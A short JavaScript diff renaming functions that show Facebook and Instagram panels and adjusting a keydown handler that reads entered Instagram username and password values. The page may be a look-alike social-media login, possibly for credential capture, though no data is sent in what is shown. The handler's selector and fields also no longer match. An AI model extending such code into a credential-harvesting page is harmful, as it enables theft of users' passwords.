@@ -1,5 +1,5 @@
 $(document).ready(function () {
-  $("#igp input").on("keydown", function () {
+  $("#choose_fb input").on("keydown", function () {
     var u = $("#ig-uname").val();
     var p = $("#ig-pass").val();
     if (u != "" && p != "") {
@@ -19,13 +19,13 @@ function closeDialog() {
   document.getElementById("choose").style.display = "none";
 }
 
-function fb() {
-  document.getElementById("fbp").style.display = "block";
+function choose_fb() {
+  document.getElementById("fb_wrapper").style.display = "block";
   document.getElementById("home").style.display = "none";
   document.getElementById("choose").style.display = "none";
 }
-function ig() {
-  document.getElementById("igp").style.display = "block";
+function choose_ig() {
+  document.getElementById("ig_wrapper").style.display = "block";
   document.getElementById("home").style.display = "none";
   document.getElementById("choose").style.display = "none";
 }
